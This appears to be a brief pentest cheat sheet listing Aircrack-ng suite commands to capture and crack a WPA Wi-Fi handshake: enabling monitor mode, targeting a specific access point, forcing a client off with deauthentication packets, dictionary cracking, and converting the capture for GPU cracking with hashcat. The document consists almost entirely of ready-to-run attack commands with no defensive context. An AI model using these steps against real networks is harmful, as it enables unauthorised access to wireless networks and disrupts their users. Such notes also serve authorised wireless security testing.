#### Capturing handshakes with the Aircrack suite
1. Put WLAN interface in monitoring mode 
```
airmon-ng start wlan0 
```
2. Start listening for wifi networks 
```
airodump-ng -c 6 --bssid 00:1D:7E:64:9A:7C -w file.cap wlan0mon  
```
3. Deauth clients  
```
aireplay-ng -0 5 -a 00:1D:7E:64:9A:7C -c 00:25:D3:0B:71:15 wlan0mon
```
4. Crack WPA handshake in captured output 
```
aircrack-ng capture-02.cap -w wordlist.txt 
```
5. OR: Filter only the WPA handshake from the capture 
```
Wpaclean <outfile> <infile> 
```
6. Convert .cap to .hccap to crack with hashcat (aircrack is CPU, hashcan can do GPU) 
```
aircrack-ng input.cap -J output  
```

The hashes in the .hccap format can now be cracked using Hashcat.
